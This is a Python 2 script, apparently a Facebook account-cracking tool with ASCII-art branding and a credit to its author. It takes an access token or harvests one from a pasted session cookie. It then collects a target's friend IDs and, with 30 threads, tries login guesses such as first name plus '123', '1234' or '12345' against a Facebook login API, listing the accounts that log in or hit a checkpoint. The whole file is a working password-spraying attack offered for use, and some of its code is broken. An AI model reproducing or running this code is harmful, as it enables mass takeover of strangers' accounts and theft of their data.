#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; Kindle Fire Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;97m|', '\033[1;97m/', '\033[1;97m-', '\033[1;97m\\']):
        if done:
            break
        sys.stdout.write('\rtunggu ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)
t.start()
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(0.5)
done = True


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.003)
		
#########LOGO#########
logo = """
\033[0;97m 
       ┌════════════════════════════════════════┐
888b     d888  .d88888b.  888    888  .d8888b. 8888888 888b    888
8888b   d8888 d88P" "Y88b 888    888 d88P  Y88b  888   8888b   888
88888b.d88888 888     888 888    888 Y88b.       888   88888b  888
888Y88888P888 888     888 8888888888  "Y888b.    888   888Y88b 888
888 Y888P 888 888     888 888    888     "Y88b.  888   888 Y88b888
888  Y8P  888 888     888 888    888       "888  888   888  Y88888
888   "   888 Y88b. .d88P 888    888 Y88b  d88P  888   888   Y8888
888       888  "Y88888P"  888    888  "Y8888P" 8888888 888    Y888 └════════════════════════════════════════┘       
        \033[0;93m└██████████████████████████████████████┘"""
                    

logo1 = """
\033[0;97m 
      ┌════════════════════════════════════════┐

▄▄▄       ██▓     ██▓
▒████▄    ▓██▒    ▓██▒
▒██  ▀█▄  ▒██░    ▒██▒
░██▄▄▄▄██ ▒██░    ░██░
 ▓█   ▓██▒░██████▒░██░
 ▒▒   ▓▒█░░ ▒░▓  ░░▓
  ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░
  ░   ▒     ░ ░    ▒ ░
      ░  ░    ░  ░ ░
[\033[41;1m CREATED BY : MOHSIN ALI \033[00;1m]\033[1;97m
--------------------------------------------------
➤ \033[1;93m Coded by : MOHSIN ALI
➤ \033[1;95m Github   : https://github.com/MohsinTheLegend
➤ \033[1;94m Facebook  :MOHSIN.ALI.THE.FATHER.OF.HATERX
➤ \033[1;92m WhatsApp  :03063112***
\033[1;97m --------------------------------------------------
      \033[0;97m└════════════════════════════════════════┘"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m[\033[0;93m●\033[0;97m]\033[0;93m Loging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\n\033[0;97m┌════════════════════════════════════════┐"
	print "\033[0;97m  [\033[0;97m01\033[0;97m]\033[0;96m\033[0;93m LOGIN WITH Token"
	print "\033[0;97m  [\033[0;97m02\033[0;97m]\033[0;96m\033[0;93m Login WITH COOKIES FB"
	print "\033[0;97m  [\033[0;97m00\033[0;97m]\033[0;96m\033[0;97m EXIT"
	print "\033[0;97m└════════════════════════════════════════┘"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[0;97m [\033[0;97m•\033[0;93m•\033[0;97m]\033[0;97m ")
	if msuk =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m] FILL CORRECT Bro !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2"or msuk =="02":
		cookie()
	elif msuk =="3"or msuk =="03":
		cooiee()
	elif msuk =="4"or msuk =="04":
		ambil_token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m] FILL CORRECT Bro !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	print "\n\033[0;97m┌═══════════════════════════════════════┐"
	toket = raw_input("\n\033[0;97m[\033[0;39m?\033[1;97m] \033[0;97mToken : \033[0;93m")
	print "\n\033[0;97m└════════════════════════════════════════┘"
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txtu", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;97m[\033[0;39m✓\033[0;97m]\033[0;92m Login Successful'
		os.system('clear')
		print logo
		jalan ('\033[0;97m\nIF U NEED ANY HELP TO CONTACT ME ON FB')
		jalan ('\033[0;97mLIKE MY PAGE , THANK YOU 🙏')
		os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX')
		menu()
	except KeyError:
		print "\033[0;97m[\033[0;39m!\033[0;97m] \033[1;92mToken Wrong !"
		time.sleep(0.01)
		masuk()
		


######AMBIL_TOKEN######
def ambil_token():
	os.system ("clear")
	print logo
	print 50* "\033[1;94m─"
	jalan("        \033[1;92mMy Page ...")
	os.system('xdg-open https://m.facebook.com/MohsinAliOfficail')
	time.sleep(2)
	masuk()
	
	######AMBIL_TOKEN######



			
#####LOGIN_COOKIE#####
######Login_Cookie######
def cookie():
	os.system("clear")
	print logo
	print "\n\033[0;97m┌════════════════════════════════════════┐"
	cookie = raw_input("\n\033[0;97m[\033[0;39m?\033[1;97m] \033[0;97mCookie : \033[0;93m ")
	print "\n\033[0;97m└════════════════════════════════════════┘"
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan di ganti Ya sayang ku.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] No Connection"
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print '\n\033[0;97m[\033[0;92m√\033[1;97m]\033[0;92m Login Sucessful'
	time.sleep(2)
	menu()
			
			


######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[0;96m[!] \033[0;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] connecation lost"
		keluar()
	os.system("clear")
	print logo
	print "\n\033[0;97m       [•] Welcome \033[0;93m " +name + "\033[0;97m Good Luck :) "
	bangla() 
	
	
	
	
	jalan ("     \n       \033[0;97m┌════════════════════════════════════════┐") 
	jalan ("       \033[0;93m█        \033[0;97m(1). Start Cracking             \033[0;93m█") 
	jalan ("       \033[0;97m└════════════════════════════════════════┘       ") 
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[0;97m    [\033[0;97m•\033[0;93m•\033[0;97m]\033[0;97m ")
	if unikers =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		bangla()
	elif unikers =="2" or unikers =="02":
		bangla()
	elif unikers =="3" or unikers =="03":
		pakistan() 
	elif unikers =="4" or unikers =="04":
		jebol()
	elif unikers =="5" or unikers =="05":
		dump()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih()
	
#

	
########## CRACK INDONESIA #######
def bangla():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m[!] \x1b[0;91mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		keluar()
	jalan ("     \n    \033[0;97m   ┌════════════════════════════════════════┐") 
	jalan ("       \033[0;93m█        \033[0;97m(1). Crack ID Friends           \033[0;93m█") 
	jalan ("       \033[0;97m└════════════════════════════════════════┘       ") 
	
	pilih_bangla()

#### PILIH INDO ####
def pilih_bangla():
	teak = raw_input("\033[0;97m       [\033[0;97m•\033[0;93m•\033[0;97m]\033[0;97m ")
	if teak =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar Bro!"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		idt = raw_input("\n       [ID] : \033[0;93m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
		except KeyError:
			print"\033[0;97m[\033[0;93m!\033[0;97m] ID Publik / Teman Tidak Ada !"
			raw_input("\n[ Kembali ]")
			bangla()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		try:
			print "\033[0;97m ══════════════════════════════════════════"
			idlist = raw_input('\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] Nama File Target : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;97m[\033[0;93m!\033[0;97m] File not find ! '
			raw_input('\n\033[0;92m[ \033[0;97mBACK \033[0;92m]')
		except IOError:
			print '\033[0;97m[!] File Not Found !'
			raw_input('\n\033[0;92m[ \033[0;97mBack \033[0;92m]')
			bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		pilih_bangla()
	print"     \033[0;97m  [\033[0;93m•\033[0;93m•\033[0;97m]\033[0;93m Write Request Password : "
	pass4 = raw_input(" \033[0;97m      [•\033[0;93m•\033[0;93m] Password 1 : \033[0;97m")
	pass5 = raw_input(" \033[0;97m      [•\033[0;93m•\033[0;93m] Password 2 : \033[0;97m")
	print " \033[0;97m      [•\033[0;93m•\033[0;97m] Additional Password (""\033[0;93m"+pass4+ ","" \033[0;93m"+pass5+"\033[0;97m)"
	jalan ("      \n     \033[0;97m  ┌════════════════════════════════════════┐") 
	jalan ("      \033[0;93m █        \033[0;97mPLEASE WAITING PROCESS         \033[0;93m █") 
	jalan ("      \033[0;97m └════════════════════════════════════════┘       ") 
#### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '          \033[0;97m[\033[0;92mOK\033[0;97m] ' + user + ' | ' + pass1
				oks.append(user)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + '\033[0;93m | ' + '\033[0;97m ' + pass1
					cekpoint.append(user)
				else:
					pass2 = c['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '          \033[0;97m[\033[0;92mOK\033[0;97m] ' + user + ' | ' + pass2
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + '\033[0;93m | ' + '\033[0;97m ' + pass2
							cekpoint.append(user)
						else:
							pass3 = c['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '          \033[0;97m[\033[0;92mOK\033[0;97m] ' + user + ' | ' + pass3
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + '\033[0;93m | ' + '\033[0;97m ' + pass3
									cekpoint.append(user)
								else:
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '          \033[0;97m[\033[0;92mOK\033[0;97m] ' + user + ' | ' + pass4
										oks.append(user)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + '\033[0;93m | ' + '\033[0;97m ' + pass4
											cekpoint.append(user)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '          \033[0;97m[\033[0;92mOK\033[0;97m] ' + user + ' | ' + pass5
												oks.append(user)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + '\033[0;93m | ' + '\033[0;97m ' + pass5
													cekpoint.append(user)
													
								
																			
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	jalan ("      \033[0;97m┌════════════════════════════════════════┐       ") 
	print "\n\033[0;97m                       DONE √ "
	print "\033[0;93m        CP : "+str(len(cekpoint))+"\033[0;92m                         OK : "+str(len(oks))
	jalan ("      \033[0;97m└════════════════════════════════════════┘       ") 
	raw_input("\033[0;97m                     [ Back \033[0;97m]")
	os.system("python2 MOHSIN.py")
	
#
    

if __name__=='__main__':
        menu()
        masuk()
